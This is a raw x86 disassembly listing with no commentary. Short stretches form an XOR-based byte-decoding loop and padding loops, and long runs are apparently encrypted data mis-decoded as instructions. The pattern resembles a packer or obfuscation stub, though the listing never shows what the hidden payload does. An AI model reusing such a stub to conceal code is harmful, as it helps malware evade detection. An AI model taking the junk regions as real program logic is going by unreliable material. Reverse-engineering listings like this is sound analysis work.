  407af3:	add    bh,dh
  407af5:	cmp    eax,0xbc5eb477
  407afa:	pop    esi
  407afb:	lods   eax,DWORD PTR ds:[esi]
  407afc:	sub    DWORD PTR [edx+0x2923ba83],edx
  407b02:	out    dx,eax
  407b03:	adc    eax,DWORD PTR [edx]
  407b05:	inc    edx
  407b06:	pop    edx
  407b07:	je     0x407b49
  407b09:	pop    esp
  407b0a:	clc    
  407b0b:	mov    ds:0x7b617be0,al
  407b10:	dec    ebp
  407b11:	scas   al,BYTE PTR es:[edi]
  407b12:	ror    DWORD PTR [ebp+edi*4+0x76f629a6],cl
  407b19:	mov    ebx,0x898e82fb
  407b1e:	inc    esp
  407b1f:	test   eax,0x1934e577
  407b24:	xor    BYTE PTR ds:0x6da7d850,bh
  407b2a:	jns    0x407b0c
  407b2c:	retf   
  407b2d:	sub    DWORD PTR [ebx+0x8],ecx
  407b30:	scas   al,BYTE PTR es:[edi]
  407b31:	pop    ecx
  407b32:	retf   
  407b33:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  407b35:	adc    DWORD PTR [edx],ecx
  407b37:	push   ds
  407b38:	cmp    edx,0x59dbc03b
  407b3e:	pushf  
  407b3f:	test   BYTE PTR [ecx],bh
  407b41:	inc    ebx
  407b42:	pop    ds
  407b43:	(bad)  
  407b44:	loopne 0x407b82
  407b46:	mov    esp,0x48e72f5b
  407b4b:	icebp  
  407b4c:	pop    ecx
  407b4d:	jae    0x407b9b
  407b4f:	sbb    BYTE PTR [edx+0x4ecd12ce],dl
  407b55:	scas   al,BYTE PTR es:[edi]
  407b56:	test   DWORD PTR [ecx+0x59f4d5b4],edi
  407b5c:	cmp    BYTE PTR [esi+0x610082d1],dl
  407b62:	leave  
  407b63:	pop    ebx
  407b64:	cs push 0x39871659
  407b6a:	jo     0x407ba1
  407b6c:	fstp   QWORD PTR [ecx+0x11]
  407b6f:	sbb    DWORD PTR [esi-0x13],0x88e853
  407b76:	xchg   esi,eax
  407b77:	pop    esp
  407b78:	fs icebp 
  407b7a:	dec    BYTE PTR [edi+0x6c72c678]
  407b80:	sbb    ecx,DWORD PTR [eax]
  407b82:	aam    0xcf
  407b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b85:	sub    BYTE PTR [ebp+0x6b98aa1],dl
  407b8b:	xchg   edi,eax
  407b8c:	or     ebx,DWORD PTR [ebx+0x15]
  407b8f:	mov    WORD PTR [eax],ds
  407b91:	adc    eax,DWORD PTR [edx-0x7]
  407b94:	aas    
  407b95:	mov    bl,0xa0
  407b97:	and    dh,BYTE PTR [esi+0x64]
  407b9a:	xor    DWORD PTR [ebx-0x19ad925e],esi
  407ba0:	add    edi,DWORD PTR [ebp+0x10]
  407ba3:	xor    edx,ecx
  407ba5:	add    edx,esi
  407ba7:	cmp    edx,edi
  407ba9:	ja     0x407bff
  407baf:	push   ebx
  407bb0:	jmp    0x407bba
  407bb5:	mov    esi,0x32729f
  407bba:	mov    eax,DWORD PTR [ebp-0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x4]
  407bc0:	xor    edi,ecx
  407bc2:	add    edi,esi
  407bc4:	mov    esi,DWORD PTR [ebp+0x8]
  407bc7:	imul   edi,edx
  407bca:	mov    ebx,DWORD PTR [ebp+0xc]
  407bcd:	xor    eax,ecx
  407bcf:	add    eax,edx
  407bd1:	mov    al,BYTE PTR [ebx+eax*1+0x32729f]
  407bd8:	mov    BYTE PTR [edi+esi*1],al
  407bdb:	mov    eax,DWORD PTR [ebp-0x4]
  407bde:	xor    eax,ecx
  407be0:	lea    edx,[edx+eax*1+0x32729f]
  407be7:	mov    eax,DWORD PTR [ebp-0x4]
  407bea:	xor    eax,ecx
  407bec:	mov    esi,0xffcd8d61
  407bf1:	sub    esi,eax
  407bf3:	add    esi,DWORD PTR [ebp+0x10]
  407bf6:	cmp    edx,esi
  407bf8:	jbe    0x407bb5
  407bfe:	pop    ebx
  407bff:	mov    eax,0xf89c853b
  407c04:	pop    edi
  407c05:	pop    esi
  407c06:	leave  
  407c07:	ret    0xc
  407c0a:	push   ebp
  407c0b:	mov    ebp,esp
  407c0d:	mov    eax,ds:0x40d654
  407c12:	mov    DWORD PTR ds:0x417e3d,0x19
  407c1c:	cmp    DWORD PTR ds:0x417e3d,0x0
  407c23:	je     0x407c51
  407c29:	cmp    DWORD PTR ds:0x417e3d,0x1c
  407c30:	jne    0x407c3f
  407c36:	push   DWORD PTR [ebp-0x14]
  407c39:	call   DWORD PTR ds:0x40d368
  407c3f:	mov    ecx,DWORD PTR ds:0x417e3d
  407c45:	dec    ecx
  407c46:	mov    DWORD PTR ds:0x417e3d,ecx
  407c4c:	jmp    0x407c1c
  407c51:	mov    edx,0x32729f
  407c56:	sub    eax,edx
  407c58:	mov    ecx,0x7510859
  407c5d:	and    DWORD PTR ds:0x41237c,0x41abd2
  407c67:	push   esi
  407c68:	and    DWORD PTR ds:0x41abd2,0x0
  407c72:	push   DWORD PTR ds:0x41abd2
  407c78:	pop    esi
  407c79:	inc    esi
  407c7a:	mov    DWORD PTR ds:0x41abd2,esi
  407c80:	cmp    DWORD PTR ds:0x41abd2,0x28
  407c87:	jne    0x407ca2
  407c8d:	push   0x7e5a
  407c92:	push   0x41abde
  407c97:	push   0x1ce6
  407c9c:	call   DWORD PTR ds:0x40d1e0
  407ca2:	cmp    DWORD PTR ds:0x41abd2,0x1f
  407ca9:	jb     0x407c72
  407caf:	xor    DWORD PTR ds:0x412354,ebx
  407cb5:	mov    esi,DWORD PTR [ebp+0xc]
  407cb8:	xor    eax,ecx
  407cba:	jmp    0x407e39
  407cbf:	xchg   ebp,eax
  407cc0:	bound  ecx,QWORD PTR [ecx-0x6a06a6f5]
  407cc6:	pusha  
  407cc7:	jmp    0x8e33:0x1cfdba79
  407cce:	aad    0xe9
  407cd0:	adc    edi,DWORD PTR [esi+0x7e]
  407cd3:	fdivr  QWORD PTR [edi+0x7e]
  407cd6:	jle    0x407c97
  407cd8:	mov    ch,0xf7
  407cda:	and    BYTE PTR [edx+0x5c],dl
  407cdd:	mov    edi,ecx
  407cdf:	sbb    eax,0x129e1c68
  407ce4:	lds    esp,FWORD PTR [ebx+ebx*4+0x7c004abf]
  407ceb:	inc    ecx
  407cec:	in     eax,dx
  407ced:	add    BYTE PTR [eax-0x55],ah
  407cf0:	pop    edx
  407cf1:	(bad)  
  407cf2:	scas   al,BYTE PTR es:[edi]
  407cf3:	retf   0xcc5c
  407cf6:	jg     0x407d60
  407cf8:	adc    DWORD PTR [edi+0x77],0x10b348f6
  407cff:	leave  
  407d00:	xchg   edi,eax
  407d01:	push   cs
  407d02:	jae    0x407d79
  407d04:	arpl   WORD PTR [edi-0x1d47739],si
  407d0a:	daa    
  407d0b:	push   ebp
  407d0c:	(bad)  
  407d0d:	inc    dh
  407d0f:	jle    0x407d8d
  407d11:	pop    ds
  407d12:	or     esp,edx
  407d14:	xor    DWORD PTR [edi+ebp*4],0xffffffde
  407d18:	jl     0x407cea
  407d1a:	(bad)  
  407d1c:	bound  ebx,QWORD PTR [esi+0x6780fb15]
  407d22:	dec    esp
  407d23:	xchg   ebx,eax
  407d24:	ror    BYTE PTR [edx+0x5ce23a99],1
  407d2a:	dec    edi
  407d2b:	ja     0x407cd2
  407d2d:	fdivr  QWORD PTR [eax]
  407d2f:	sbb    DWORD PTR [eax+0x1b],0x99b6b478
  407d36:	mov    edx,0x242aec2
  407d3b:	and    BYTE PTR [ecx+0x2048c389],0x6f
  407d42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d43:	lods   al,BYTE PTR ds:[esi]
  407d44:	dec    ebx
  407d45:	loope  0x407db3
  407d47:	ret    
  407d48:	dec    ebp
  407d49:	je     0x407d5f
  407d4b:	retf   
  407d4c:	cmp    DWORD PTR [esi+0x6be09065],esp
  407d52:	and    DWORD PTR [esi+0x79],esp
  407d55:	cmp    BYTE PTR [edx+0x50cd44e9],ch
  407d5b:	mov    ecx,esi
  407d5d:	cmc    
  407d5e:	(bad)  
  407d5f:	mov    ecx,0x4da0e9e6
  407d64:	adc    al,0xf0
  407d66:	xor    edx,DWORD PTR [edi+0xd]
  407d69:	(bad)  
  407d6a:	in     eax,0xf3
  407d6c:	jmp    0x407d04
  407d6e:	popf   
  407d6f:	iret   
  407d70:	pop    ebp
  407d71:	mov    eax,0xe083ac85
  407d76:	xchg   ebp,eax
  407d77:	jb     0x407daf
  407d79:	(bad)  
  407d7a:	daa    
  407d7b:	outs   dx,BYTE PTR ds:[esi]
  407d7c:	cmp    eax,0x7480a75c
  407d81:	pushf  
  407d82:	jp     0x407d70
  407d84:	cmp    dh,BYTE PTR [eax+0x39]
  407d87:	in     al,0x64
  407d89:	cdq    
  407d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d8b:	mov    al,ds:0xbddbe4ad
  407d90:	pop    edi
  407d91:	xor    al,0xc0
  407d93:	jecxz  0x407d83
  407d95:	leave  
  407d96:	es (bad) 
  407d98:	cli    
  407d99:	jns    0x407d42
  407d9b:	sbb    bh,BYTE PTR [ebx+eax*8]
  407d9e:	fimul  WORD PTR [ecx-0x18e293f5]
  407da4:	test   al,bh
  407da6:	inc    ebp
  407da7:	add    bl,BYTE PTR [ecx+eiz*1-0x6f]
  407dab:	jp     0x407dff
  407dad:	int    0xc2
  407daf:	js     0x407dbf
  407db1:	pop    edx
  407db2:	push   ss
  407db3:	xchg   ebx,eax
  407db4:	push   ebx
  407db5:	lods   al,BYTE PTR ds:[esi]
  407db6:	adc    DWORD PTR [ebx+0xd],ebx
  407db9:	xchg   ebp,eax
  407dba:	pop    es
  407dbb:	push   es
  407dbc:	add    DWORD PTR [ebp-0x10318180],ecx
  407dc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dc3:	xchg   esi,eax
  407dc4:	pop    esi
  407dc5:	pop    ds
  407dc6:	test   ecx,eax
  407dc8:	(bad)
  407dcd:	xchg   BYTE PTR [edx+0x27788d87],ah
  407dd3:	jne    0x407d9a
  407dd5:	aad    0x8b
  407dd7:	aad    0xc5
  407dd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dda:	mov    DWORD PTR [esp+esi*1-0xe7b5b06],ebp
  407de1:	jbe    0x407d6d
  407de3:	hlt    
  407de4:	xchg   edi,eax
  407de5:	pop    ds
  407de6:	fstp   TBYTE PTR [ebp+0x53]
  407de9:	mov    cl,0x69
  407deb:	aas    
  407dec:	aad    0x85
  407dee:	fsub   QWORD PTR [esi+0x5d7e04ae]
  407df4:	aas    
  407df5:	je     0x407e35
  407df7:	xchg   ebx,eax
  407df8:	mov    dl,0xe0
  407dfa:	sub    al,0x99
  407dfc:	add    DWORD PTR [eax],ebx
  407dfe:	scas   al,BYTE PTR es:[edi]
  407dff:	cld    
  407e00:	int    0xf7
  407e02:	dec    eax
  407e03:	mov    eax,ds:0xaacdee8b
  407e08:	sbb    esi,esi
  407e0a:	mov    dl,0x40
  407e0c:	ss clc 
  407e0e:	adc    eax,0xee8c5ce7
  407e13:	out    0x51,eax
  407e15:	xor    ch,bh
  407e17:	and    bl,bl
  407e19:	jecxz  0x407df7
  407e1b:	xchg   edi,eax
  407e1c:	jge    0x407db9
  407e1e:	xchg   ch,ch
  407e20:	jb     0x407dfe
  407e22:	cld    
  407e23:	retf   0xb9de
  407e26:	aaa    
  407e27:	pop    edi
  407e28:	dec    esi
  407e29:	cmc    
  407e2a:	mov    WORD PTR [ebx-0x6a444b60],es
  407e30:	gs or  al,0xa5
  407e33:	or     BYTE PTR [esi],dl
  407e35:	and    bl,BYTE PTR [ebx-0x39c4c94a]
  407e3b:	mov    DWORD PTR ds:0x41abe2,0x45d5
  407e45:	je     0x40818a
  407e4b:	mov    eax,ds:0x40d64c
  407e50:	mov    esi,DWORD PTR [ebp+0xc]
  407e53:	sub    eax,edx
  407e55:	xor    eax,ecx
  407e57:	cmp    eax,esi
  407e59:	jne    0x407e6f
  407e5f:	mov    eax,ds:0x40d654
  407e64:	add    eax,DWORD PTR ds:0x40d64c
  407e6a:	jmp    0x407ff5
  407e6f:	mov    eax,DWORD PTR [ebp+0xc]
  407e72:	jmp    0x407ff1
  407e77:	icebp  
  407e78:	mov    ebp,0x65db1f07
  407e7d:	mov    ecx,0x1c6c5851
  407e82:	cmp    DWORD PTR ds:0x4f02a1b2,edi
  407e88:	adc    BYTE PTR [esi+0x7e],bh
  407e8b:	fdivr  QWORD PTR [edi+0x7e]
  407e8e:	jle    0x407e61
  407e90:	jp     0x407ed8
  407e92:	not    ah
  407e94:	push   0xe57a198c
  407e99:	push   0xffffffcb
  407e9b:	fsubr  st(3),st
  407e9d:	jg     0x407e68
  407e9f:	outs   dx,BYTE PTR ds:[esi]
  407ea0:	pop    es
  407ea1:	mov    eax,0x69ecf786
  407ea6:	test   DWORD PTR [ebx],ecx
  407ea8:	ret    
  407ea9:	test   esi,esi
  407eab:	xchg   esp,eax
  407eac:	aaa    
  407ead:	cmc    
  407eae:	mov    esp,0x1cf6e8ef
  407eb3:	aam    0xa0
  407eb5:	adc    DWORD PTR [eax],ebp
  407eb7:	add    DWORD PTR [ecx],ecx
  407eb9:	xor    eax,0xb1320e4c
  407ebe:	jmp    0x407f2a
  407ec0:	cmp    eax,0x73ec82fe
  407ec5:	in     eax,dx
  407ec6:	icebp  
  407ec7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ec8:	add    bh,BYTE PTR [ecx]
  407eca:	cmp    al,BYTE PTR [ecx-0x14]
  407ecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ece:	clc    
  407ecf:	outs   dx,DWORD PTR ds:[esi]
  407ed0:	inc    ebx
  407ed1:	adc    al,0x12
  407ed3:	dec    esi
  407ed4:	jp     0x407ed9
  407ed6:	sbb    BYTE PTR [esi-0x1022af3f],dh
  407edc:	jns    0x407ef1
  407ede:	jle    0x407f21
  407ee0:	and    al,0xed
  407ee2:	jmp    DWORD PTR [ecx+eiz*8-0x14]
  407ee6:	mov    edx,gs
  407ee8:	jle    0x407ec0
  407eea:	push   DWORD PTR [esi]
  407eec:	jp     0x407f40
  407eee:	fs xor eax,0x622c5c7f
  407ef4:	xchg   ebp,eax
  407ef5:	test   BYTE PTR [esi+0x69],0xc5
  407ef9:	int    0xc4
  407efb:	inc    ecx
  407efc:	ret    0xc3e8
  407eff:	pop    ecx
  407f00:	push   cs
  407f01:	call   0x22a:0x21fea0a6
  407f08:	sub    BYTE PTR ds:0x9af7b286,bh
  407f0e:	mov    esp,0x2d87e7c0
  407f13:	jno    0x407f89
  407f15:	cli    
  407f16:	das    
  407f17:	xor    ecx,DWORD PTR [edi+0x6ec05f97]
  407f1d:	leave  
  407f1e:	xor    al,0x96
  407f20:	int3   
  407f21:	hlt    
  407f22:	sti    
  407f23:	jbe    0x407f7a
  407f25:	ret    0xbc8f
  407f28:	clc    
  407f29:	mov    ebx,0xdc4d4f85
  407f2e:	retf   
  407f2f:	data16 fwait
  407f31:	imul   eax,DWORD PTR [eax],0x130f3ccd
  407f37:	test   BYTE PTR [edx],bl
  407f39:	mov    WORD PTR [eax*4+0x63189b2c],cs
  407f40:	scas   al,BYTE PTR es:[edi]
  407f41:	inc    esp
  407f42:	nop
  407f43:	cdq    
  407f44:	mov    al,0xea
  407f46:	sub    eax,DWORD PTR [ecx]
  407f48:	dec    ebx
  407f49:	push   edi
  407f4a:	nop
  407f4b:	xor    al,0x42
  407f4d:	mov    edi,0x10e28ec9
  407f52:	and    ah,al
  407f54:	and    al,0x1
  407f56:	dec    edx
  407f57:	and    ch,ah
  407f59:	pop    ds
  407f5a:	mov    ds:0xb212a37d,al
  407f5f:	retf   0xea62
  407f62:	and    ah,BYTE PTR [edx-0x7da69152]
  407f68:	jp     0x407f58
  407f6a:	or     BYTE PTR ss:[eax-0x6f],0x2f
  407f6f:	and    eax,0x96cf51e0
  407f74:	test   eax,0x8a57f9da
  407f79:	sahf   
  407f7a:	and    eax,0x4f916375
  407f7f:	push   DWORD PTR [edi+0x8]
  407f82:	sub    BYTE PTR [esi-0x2f],bl
  407f85:	loopne 0x407f53
  407f87:	adc    eax,0x74c9f820
  407f8c:	out    dx,al
  407f8d:	mov    dh,0x2f
  407f8f:	and    bl,BYTE PTR [edx+0x37]
  407f92:	cmp    BYTE PTR [edi-0x26],ch
  407f95:	dec    ebx
  407f96:	nop
  407f97:	pop    esp
  407f98:	cmp    BYTE PTR [esi-0x6787136e],ch
  407f9e:	adc    DWORD PTR [esi+0x42],edi
  407fa1:	test   esp,edx
  407fa3:	inc    ebp
  407fa4:	(bad)  
  407fa5:	cwde   
  407fa6:	sti    
  407fa7:	stc    
  407fa8:	add    ah,BYTE PTR [edi-0x15]
  407fab:	and    eax,DWORD PTR [edx+0x5]
  407fae:	push   0x140cfe18
  407fb3:	dec    ebx
  407fb4:	push   esp
  407fb5:	and    ch,BYTE PTR [edx-0x52498dcf]
  407fbb:	inc    esi
  407fbc:	adc    al,0x6c
  407fbe:	xor    al,0x74
  407fc0:	dec    edx
  407fc1:	and    al,BYTE PTR [edi]
  407fc3:	adc    eax,0x41fef900
  407fc8:	aaa    
  407fc9:	or     al,0xae
  407fcb:	sub    eax,0x4b4a59fc
  407fd0:	push   es
  407fd1:	sub    BYTE PTR [ebx+0x9ea1d80],bl
  407fd7:	scas   al,BYTE PTR es:[edi]
  407fd8:	jbe    0x407f5a
  407fda:	retf   0x8cf
  407fdd:	sub    BYTE PTR [ebx-0x7242ec55],bh
  407fe3:	jnp    0x408025
  407fe5:	test   edx,esp
  407fe7:	in     al,dx
  407fe8:	in     eax,0xae
  407fea:	inc    ecx
  407feb:	pop    es
  407fec:	sub    BYTE PTR [ecx-0x1b],0x27
  407ff0:	fwait
  407ff1:	xor    eax,ecx
  407ff3:	add    eax,edx
  407ff5:	mov    ds:0x40d64c,eax
  407ffa:	mov    eax,DWORD PTR [ebp+0xc]
  407ffd:	jmp    0x40817c
  408002:	and    ebp,DWORD PTR [edi]
  408004:	pop    ds
  408005:	xchg   edx,eax
  408006:	adc    esp,DWORD PTR [edx+0x57bdafa3]
  40800c:	arpl   WORD PTR [edi],si
  40800e:	out    dx,al
  40800f:	mov    cl,BYTE PTR ds:0x7e162d09
  408015:	jle    0x407ff3
  408017:	jg     0x408097
  408019:	jle    0x407ff3
  40801b:	sbb    eax,DWORD PTR [eax-0x3cc99a91]
  408021:	dec    esi
  408022:	dec    edx
  408023:	dec    ebx
  408024:	scas   al,BYTE PTR es:[edi]
  408025:	pop    ecx
  408026:	loop   0x407fa9
  408028:	push   ebp
  408029:	add    al,0xf6
  40802b:	pop    esp
  40802c:	out    dx,al
  40802d:	mov    al,BYTE PTR [edi-0x4f7f25c5]
  408033:	cwde   
  408034:	jle    0x40802f
  408036:	mov    al,0xbe
  408038:	mov    bl,0xe3
  40803a:	inc    ecx
  40803b:	and    eax,0xb957a491
  408040:	push   edx
  408041:	cmp    ch,al
  408043:	test   DWORD PTR [esi+0x1162a8da],ebx
  408049:	fmulp  st(3),st
  40804b:	test   eax,0xb14a8fc
  408050:	in     al,0x42
  408052:	and    BYTE PTR [ecx+0x55fe4ba8],ah
  408058:	cs mov cl,0xf9
  40805b:	jbe    0x408010
  40805d:	popa   
  40805e:	jo     0x407ffe
  408060:	mov    edi,0x91210530
  408065:	bound  esi,QWORD PTR [edx]
  408067:	push   ebp
  408068:	loop   0x4080c1
  40806a:	test   eax,0x1d53ee5a
  40806f:	xchg   esp,eax
  408070:	rol    DWORD PTR [edi+0x4d0843f3],cl
  408076:	and    dl,BYTE PTR [edi+0x6bed34a]
  40807c:	cmp    bh,BYTE PTR [edi-0x7f]
  40807f:	push   ss
  408080:	rcr    BYTE PTR [eax-0x3e],cl
  408083:	out    dx,al
  408084:	es pop eax
  408086:	push   cs
  408087:	pop    es
  408088:	dec    edi
  408089:	cmp    ch,BYTE PTR [ebx]
  40808b:	ins    BYTE PTR es:[edi],dx
  40808c:	xchg   ecx,eax
  40808d:	sti    
  40808e:	punpcklbw mm2,DWORD PTR [edi]
  408091:	sub    DWORD PTR [edi-0x56],eax
  408094:	lods   eax,DWORD PTR ds:[esi]
  408095:	icebp  
  408096:	fcmovbe st,st(5)
  408098:	in     al,dx
  408099:	(bad)  
  40809a:	sub    eax,0xbea9da1d
  40809f:	div    al
  4080a1:	adc    eax,0xd27124fc
  4080a6:	and    al,0x88
  4080a8:	fmul   DWORD PTR [ebx+0x3e]
  4080ab:	mov    ah,0x9a
  4080ad:	xchg   esp,eax
  4080ae:	push   cs
  4080af:	sub    dh,BYTE PTR [edx]
  4080b1:	inc    eax
  4080b2:	js     0x40804d
  4080b4:	(bad)  
  4080b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080b6:	out    0x42,eax
  4080b8:	out    0x34,eax
  4080ba:	sub    edi,eax
  4080bc:	pop    ds
  4080bd:	and    eax,0x62f78f89
  4080c2:	mov    eax,ds:0xa6439192
  4080c7:	cmp    BYTE PTR [edi-0x19],dh
  4080ca:	xor    eax,0xea51ca97
  4080cf:	mov    BYTE PTR [ecx-0x1c],al
  4080d2:	es inc ecx
  4080d4:	sbb    ebp,ebx
  4080d6:	sub    ebp,DWORD PTR ss:[edx]
  4080d9:	(bad)  
  4080da:	(bad)  
  4080dc:	bound  edx,QWORD PTR [ebx+edx*4+0x2]
  4080e0:	cmp    al,0xbb
  4080e2:	outs   dx,DWORD PTR ds:[esi]
  4080e3:	fcomp  DWORD PTR [edx-0x5b]
  4080e6:	in     al,0xb7
  4080e8:	test   eax,0x27a7e73b
  4080ed:	aad    0xd8
  4080ef:	das    
  4080f0:	mov    eax,0xf1d884af
  4080f5:	dec    edi
  4080f6:	xor    al,0xbc
  4080f8:	xor    ecx,DWORD PTR [eax]
  4080fa:	mov    cl,0x25
  4080fc:	cmp    al,cl
  4080fe:	sub    DWORD PTR ds:0xd31dac79,esi
  408104:	or     edx,esp
  408106:	popa   
  408107:	dec    edx
  408108:	out    0x74,al
  40810a:	sbb    edi,DWORD PTR [ecx+0x67]
  40810d:	mov    al,es:0x99d2d7e7
  408113:	in     al,dx
  408114:	jo     0x4080ab
  408116:	pop    esp
  408117:	popa   
  408118:	sahf   
  408119:	repz and eax,0x6fa73473
  40811f:	dec    edx
  408120:	rol    DWORD PTR [eax+eax*1],cl
  408123:	nop
  408124:	ret    
  408125:	rcr    bh,1
  408127:	jmp    0x3b557dff
  40812c:	shr    DWORD PTR [esi+0xc],cl
  40812f:	and    DWORD PTR [edx+0x7a],edx
  408132:	pop    ss
  408133:	retf   0xc736
  408136:	je     0x4080f2
  408138:	repz mov eax,ds:0x58727f3d
  40813e:	dec    edx
  40813f:	imul   esi,esp,0xffffffb8
  408142:	push   esp
  408143:	push   0x2d
  408145:	mov    bh,0x9d
  408147:	cmp    al,0x7b
  408149:	aam    0x8c
  40814b:	pop    es
  40814c:	neg    BYTE PTR [edi+0x12fddc09]
  408152:	mov    bh,0xf7
  408154:	jo     0x40817a
  408156:	addr16 cmc 
  408158:	imul   ebx,ebp,0x21
  40815b:	cmc    
  40815c:	inc    ebx
  40815d:	ret    0xface
  408160:	in     eax,dx
  408161:	jl     0x408114
  408163:	fild   DWORD PTR [edx]
  408165:	jbe    0x408194
  408167:	in     al,dx
  408168:	mov    dl,0x64
  40816a:	and    bl,BYTE PTR [bp+0x6e]
  40816e:	repz dec edi
  408170:	sub    DWORD PTR [edi],ecx
  408172:	into   
  408173:	push   ds
  408174:	inc    ah
  408176:	ja     0x40816d
  408178:	rcr    DWORD PTR [esi],cl
  40817a:	add    BYTE PTR [edi],ch
  40817c:	xor    eax,ecx
  40817e:	add    eax,edx
  408180:	mov    ds:0x40d654,eax
  408185:	jmp    0x408313
  40818a:	mov    eax,ds:0x40d654
  40818f:	jmp    0x40830e
  408194:	push   edi
  408195:	(bad)  [ecx+0x797ba9ef]
  40819b:	gs mov ch,0x6e
  40819e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40819f:	fld    QWORD PTR es:[esi+0x26]
  4081a3:	rol    DWORD PTR [ebx-0x238181e9],0x7f
  4081aa:	jle    0x40822a
  4081ac:	push   ds
  4081ad:	addr16 mov al,ds:0x3b68
  4081b1:	fmul   QWORD PTR [ebx+0x1a0a7c26]
  4081b7:	stos   BYTE PTR es:[edi],al
  4081b8:	iret   
  4081b9:	iret   
  4081ba:	push   edx
  4081bb:	push   esp
  4081bc:	ret    0xa3a8
  4081bf:	mov    ss,ebx
  4081c1:	mov    dh,0xc8
  4081c3:	mov    edi,0x94925cf3
  4081c8:	outs   dx,BYTE PTR ds:[esi]
  4081c9:	mov    edi,DWORD PTR [eax]
  4081cb:	jmp    0x1b6e:0xbd1dbdee
  4081d2:	out    0xfc,eax
  4081d4:	ret    0x618e
  4081d7:	pop    ebx
  4081d8:	adc    al,0x4c
  4081da:	std    
  4081db:	jmp    0xf2fc:0x620bb34c
  4081e2:	(bad)  
  4081e3:	mov    cl,0x98
  4081e5:	(bad)  
  4081e6:	jne    0x408249
  4081e8:	scas   eax,DWORD PTR es:[edi]
  4081e9:	pop    edx
  4081ea:	and    DWORD PTR [esi+0x0],0x6e
  4081ee:	add    bl,BYTE PTR ds:0xfb1d68ec
  4081f4:	not    DWORD PTR [edi+ecx*2-0x37]
  4081f8:	retf   
  4081f9:	loope  0x408183
  4081fb:	inc    ebp
  4081fc:	fld    DWORD PTR [ecx]
  4081fe:	out    0xee,eax
  408200:	push   0x95cbab52
  408205:	imul   eax,DWORD PTR [edx-0xa],0x1b
  408209:	aaa    
  40820a:	arpl   bp,di
  40820c:	mov    dl,0x3e
  40820e:	add    DWORD PTR [edi-0x72d56099],eax
  408214:	adc    eax,0x3d0f0a59
  408219:	rol    ecx,cl
  40821b:	fsubr  st(3),st
  40821d:	(bad)  
  40821e:	fidivr WORD PTR [ebp+eax*8+0x24]
  408222:	retf   
  408223:	mov    ebx,0xfe8470aa
  408228:	pushf  
  408229:	ins    DWORD PTR es:[edi],dx
  40822a:	xor    eax,0xfcffa2c9
  40822f:	fbld   TBYTE PTR ds:0x64b0ffa0
  408235:	jle    0x40827d
  408237:	jge    0x40824d
  408239:	xchg   ebx,eax
  40823a:	jmp    0x40820a
  40823c:	mov    edi,0xd7914286
  408241:	ret    0x985f
  408244:	loope  0x408270
  408246:	ins    BYTE PTR es:[edi],dx
  408247:	ja     0x40821f
  408249:	sbb    esp,DWORD PTR [ecx-0x5a]
  40824c:	mov    esp,0x2ed778ae
  408251:	out    dx,al
  408252:	outs   dx,BYTE PTR ds:[esi]
  408253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408254:	nop
  408255:	es cs sbb ebx,esi
  408259:	jbe    0x408251
  40825b:	stos   BYTE PTR es:[edi],al
  40825c:	sbb    BYTE PTR [edx],dl
  40825e:	mov    eax,ds:0x39a1f543
  408263:	mov    ecx,0xcbc44ed3
  408268:	push   ebx
  408269:	arpl   WORD PTR [edi+0x68def7c8],bx
  40826f:	mov    ebp,0xde866cef
  408274:	jo     0x408253
  408276:	inc    esi
  408277:	in     al,0xc5
  408279:	pop    ds
  40827a:	sbb    eax,0x2c25b27c
  40827f:	lods   eax,DWORD PTR ds:[esi]
  408280:	push   esp
  408281:	add    edi,DWORD PTR [ebx+0x3b8b18e]
  408287:	out    dx,eax
  408288:	out    dx,al
  408289:	aam    0x43
  40828b:	out    dx,al
  40828c:	loopne 0x40827f
  40828e:	push   0x6c729f75
  408293:	pop    esp
  408294:	and    esp,DWORD PTR [ebx+edx*2]
  408297:	dec    esi
  408298:	aaa    
  408299:	xchg   ebx,eax
  40829a:	lods   eax,DWORD PTR ds:[esi]
  40829b:	xchg   edi,eax
  40829c:	pop    edi
  40829d:	daa    
  40829e:	sti    
  40829f:	xchg   ebp,eax
  4082a0:	mov    ecx,ebp
  4082a2:	(bad)  
  4082a3:	(bad)  
  4082a4:	push   0xdfd27651
  4082a9:	dec    ecx
  4082aa:	es ss popf 
  4082ad:	jl     0x408240
  4082af:	call   0x9bc08a28
  4082b4:	std    
  4082b5:	mov    bh,0x12
  4082b7:	cld    
  4082b8:	enter  0xe2e5,0xd3
  4082bc:	jae    0x4082fc
  4082be:	add    BYTE PTR [ecx-0x6c],bh
  4082c1:	(bad)  
  4082c2:	(bad)  
  4082c3:	sbb    eax,0xa142df5
  4082c8:	xchg   edx,eax
  4082c9:	and    BYTE PTR ds:[ecx+0x4cefd06e],al
  4082d0:	push   es
  4082d1:	sub    bl,dh
  4082d3:	xchg   ebx,eax
  4082d4:	push   esi
  4082d5:	push   eax
  4082d6:	mov    esp,0x9ab62391
  4082db:	test   eax,0x9f2af1e1
  4082e0:	(bad)  [edi-0x62]
  4082e3:	ins    BYTE PTR es:[edi],dx
  4082e4:	sub    eax,0x26fa6866
  4082e9:	gs retf 0x8223
  4082ed:	hlt    
  4082ee:	jne    0x408301
  4082f0:	push   ecx
  4082f1:	not    BYTE PTR [ebx]
  4082f3:	test   cl,0x34
  4082f6:	out    dx,al
  4082f7:	mov    ds:0xf79d6b28,eax
  4082fc:	shl    BYTE PTR [ecx+eax*4],0x5b
  408300:	aas    
  408301:	xor    al,0xda
  408303:	push   cs
  408304:	add    eax,0x2ab9fd
  408309:	fbstp  TBYTE PTR [esi-0x5c9ff22f]
  40830f:	dec    esp
  408310:	(bad)  
  408311:	inc    eax
  408312:	add    BYTE PTR [ebx+0x8b0845],cl
  408318:	mov    ecx,DWORD PTR ds:0x40d64c
  40831e:	add    DWORD PTR [eax],ecx
  408320:	pop    esi
  408321:	pop    ebp
  408322:	ret    0x8
  408325:	push   ebp
  408326:	mov    ebp,esp
  408328:	sub    esp,0x58
